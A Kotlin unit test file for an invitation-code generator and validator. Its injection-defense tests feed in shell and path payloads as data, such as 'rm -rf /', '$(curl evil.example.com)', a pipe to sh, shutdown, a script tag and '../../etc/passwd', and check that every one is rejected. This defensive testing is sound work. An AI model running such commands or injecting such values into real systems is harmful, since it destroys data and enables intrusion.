package com.team376.pulsemetry.enrollment.secret

import org.assertj.core.api.Assertions.assertThat
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Test
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.ValueSource

class InvitationCodeTest {

	private val regex = Regex(InvitationCode.PATTERN)

	// ── 생성 ─────────────────────────────────────────────────────────────────

	@Test
	@DisplayName("생성된 코드가 XXXX-XXXX-XXXX 형식이다")
	fun generatedCodeMatchesPattern() {
		repeat(200) {
			assertThat(InvitationCode.generate()).matches(regex.toPattern())
		}
	}

	@Test
	@DisplayName("헷갈리는 글자 I·L·O·U 를 쓰지 않는다")
	fun generatedCodeAvoidsAmbiguousLetters() {
		val letters = (1..500).joinToString("") { InvitationCode.generate() }.replace("-", "")

		assertThat(letters).doesNotContain("I").doesNotContain("L").doesNotContain("O").doesNotContain("U")
	}

	@Test
	@DisplayName("코드가 반복되지 않는다 — SecureRandom 을 쓴다")
	fun generatedCodesAreUnique() {
		val codes = (1..2_000).map { InvitationCode.generate() }.toSet()

		assertThat(codes).hasSize(2_000)
	}

	@Test
	@DisplayName("생성된 코드는 정규화를 그대로 통과한다")
	fun generatedCodeSurvivesNormalization() {
		val code = InvitationCode.generate()

		assertThat(InvitationCode.normalize(code)).isEqualTo(code)
	}

	// ── 정규화 ───────────────────────────────────────────────────────────────

	@Test
	@DisplayName("앞뒤 공백을 제거하고 대문자로 바꾼다")
	fun normalizeTrimsAndUppercases() {
		assertThat(InvitationCode.normalize("  abcd-efgh-jkmn \n")).isEqualTo("ABCD-EFGH-JKMN")
	}

	@Test
	@DisplayName("하이픈이 없으면 4자마다 넣는다")
	fun normalizeInsertsHyphens() {
		assertThat(InvitationCode.normalize("ABCDEFGHJKMN")).isEqualTo("ABCD-EFGH-JKMN")
		assertThat(InvitationCode.normalize("abcdefghjkmn")).isEqualTo("ABCD-EFGH-JKMN")
	}

	@Test
	@DisplayName("이미 정규 형식이면 그대로 둔다")
	fun normalizeKeepsCanonicalForm() {
		assertThat(InvitationCode.normalize("0123-4567-89AB")).isEqualTo("0123-4567-89AB")
	}

	@ParameterizedTest
	@ValueSource(
		strings = [
			"ABCD-EFGH-JKM",      // 너무 짧다
			"ABCD-EFGH-JKMNP",    // 너무 길다
			"ABCD-EFGH",          // 그룹이 모자라다
			"ABCDEFGHJKM",        // 하이픈 삽입 후에도 길이가 안 맞는다
			"ABCD-EFGH-JKMI",     // I 는 알파벳에 없다
			"ABCD-EFGH-JKML",     // L 도 없다
			"ABCD-EFGH-JKMO",     // O 도 없다
			"ABCD-EFGH-JKMU",     // U 도 없다
			"ABC-DEFG-HJKMN",     // 그룹 길이가 다르다
			"ABCD_EFGH_JKMN",     // 구분자가 다르다
			"",
		],
	)
	@DisplayName("형식을 어긴 코드는 null 이다 — 400 invalid_request 로 이어진다")
	fun normalizeRejectsMalformedCodes(raw: String) {
		assertThat(InvitationCode.normalize(raw)).isNull()
	}

	@Test
	@DisplayName("null 입력은 null 이다")
	fun normalizeRejectsNull() {
		assertThat(InvitationCode.normalize(null)).isNull()
	}

	// ── 주입 방어 (A8) ───────────────────────────────────────────────────────

	@ParameterizedTest
	@ValueSource(
		strings = [
			"'; rm -rf /",
			"ABCD-EFGH-JKMN'; rm -rf /",
			"\$(curl evil.example.com)",
			"`whoami`",
			"ABCD-EFGH-JKMN\nrm -rf /",
			"ABCD-EFGH-JKMN; shutdown",
			"ABCD-EFGH-JKMN | sh",
			"ABCD&EFGH&JKMN",
			"<script>alert(1)</script>",
			"../../etc/passwd",
			"%27%3B%20rm",
		],
	)
	@DisplayName("셸·경로 메타문자가 섞인 입력은 화이트리스트에서 걸린다")
	fun normalizeRejectsInjectionAttempts(raw: String) {
		assertThat(InvitationCode.normalize(raw)).isNull()
		assertThat(InvitationCode.matches(raw)).isFalse()
	}

	@Test
	@DisplayName("정규식이 허용하는 문자에는 셸 메타문자가 하나도 없다")
	fun alphabetContainsNoShellMetacharacters() {
		val allowed = ('0'..'9') + ('A'..'Z') - listOf('I', 'L', 'O', 'U')
		val dangerous = "'\"`;|&\$(){}[]<>\\/*?!#~ \n\r\t".toSet()

		assertThat(allowed.filter { it in dangerous }).isEmpty()
		// 정규식이 실제로 그 문자들을 거부하는지도 확인한다
		dangerous.forEach { ch ->
			assertThat(InvitationCode.matches("ABC$ch-EFGH-JKMN")).isFalse()
		}
	}

	@Test
	@DisplayName("matches 는 형식만 본다 — DB 조회 없이 판정한다")
	fun matchesChecksFormatOnly() {
		assertThat(InvitationCode.matches("ABCD-EFGH-JKMN")).isTrue()
		assertThat(InvitationCode.matches("abcd-efgh-jkmn")).isFalse()
		assertThat(InvitationCode.matches(null)).isFalse()
	}
}
